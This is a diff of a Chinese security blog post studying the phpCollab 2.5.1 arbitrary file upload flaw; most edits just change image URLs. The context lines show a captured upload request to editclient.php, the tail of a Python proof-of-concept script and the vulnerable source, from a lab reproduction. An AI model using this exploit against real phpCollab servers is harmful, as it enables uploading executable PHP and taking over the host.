@@ -14,17 +14,17 @@
 <meta property="og:site_name" content="Sec-note">
 <meta property="og:description" content="phpCollab 2.5.1 - Arbitrary File Upload漏洞的学习。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-12/79648453.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-12/79648453.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-12/91535998.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-12/83332319.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-12/86380888.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-12/89045811.jpg">
-<meta property="og:updated_time" content="2018-02-05T09:50:24.000Z">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/79648453.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/79648453.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/91535998.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/83332319.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/86380888.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/89045811.jpg">
+<meta property="og:updated_time" content="2018-12-11T12:38:53.095Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpCollab 2.5.1 - Arbitrary File Upload">
 <meta name="twitter:description" content="phpCollab 2.5.1 - Arbitrary File Upload漏洞的学习。">
-<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-12/79648453.jpg">
+<meta name="twitter:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/79648453.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Sec-note" type="application/atom+xml">
   
@@ -103,11 +103,11 @@
 <p><a href="https://www.exploit-db.com/apps/dda41c5b541d7adc0b50b1fcf3bf7519-phpCollab-v2.5.1.zip" target="_blank" rel="noopener">下载phpcollab</a></p>
 <p>直接在自己搭建的服务器上安装就行了。</p>
 <h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>必须注册一个账户，登录后台里面。在客户–客户组织–编辑处，上传文件的地方存在任意文件上传漏洞。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-10-12/79648453.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/79648453.jpg" alt=""></p>
 <p>在标志处，需要上传文件。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-10-12/79648453.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/79648453.jpg" alt=""></p>
 <p>F12–查看该标志文件的地址，知道在<code>&quot;../logos_clients/</code>目录下面。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-10-12/91535998.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/91535998.jpg" alt=""></p>
 <p>直接上传就可以，Burpsuite抓包，看一下。</p>
 <pre><code>POST /phpcollab/clients/editclient.php?id=2&amp;action=update&amp;PHPSESSID=sos714moqg2obs6sc24p55hko1 HTTP/1.1
 Host: 192.168.86.194
@@ -165,9 +165,9 @@ Content-Disposition: form-data; name=&quot;extensionOld&quot;
 txt
 -----------------------------17918258359334--
 </code></pre><p>我们通过标志处，就可以知道上传的文件被重新命令了，但还是php后缀。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-10-12/83332319.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/83332319.jpg" alt=""></p>
 <p>很多时候都是上传后的文件，路径找不到，或者文件名字被修改。但这次顺利通过其源码可以找到，然后访问。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-10-12/86380888.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/86380888.jpg" alt=""></p>
 <h5 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h5><p>知道一个漏洞后，想着要自动化或者提高效率，需要写一个脚本来实现其中的功能。</p>
 <p>POC已经给出了，学习一下其中的原理。利用<code>requests</code>实现文件的上传。</p>
 <pre><code>#!/usr/bin/python
@@ -194,7 +194,7 @@ if __name__ == &apos;__main__&apos;:
     else:
         print(&quot;[FAIL]Problem(status:%s) (link:%s)&quot; % (r.status_code,link))
 </code></pre><p>利用，可以上传成功。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-10-12/89045811.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-12/89045811.jpg" alt=""></p>
 <h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>利用以及poc完成之后，开始从源代码分析，是哪里出现了问题。<br>出现漏洞的代码在 <code>\clients\editclient.php</code>里面，这就是对客户信息修改的代码文件。</p>
 <pre><code>//case update client organization
 if ($id != &quot;&quot;) 
@@ -234,7 +234,7 @@ if ($id != &quot;&quot;)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/10/13/phpcollab_file/" data-id="cjnkdsvj2001k08xdzvrkx6og" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/10/13/phpcollab_file/" data-id="cjpjt0n4t001a4dxdmtp9rxxd" class="article-share-link">Share</a>
       
       
     </footer>
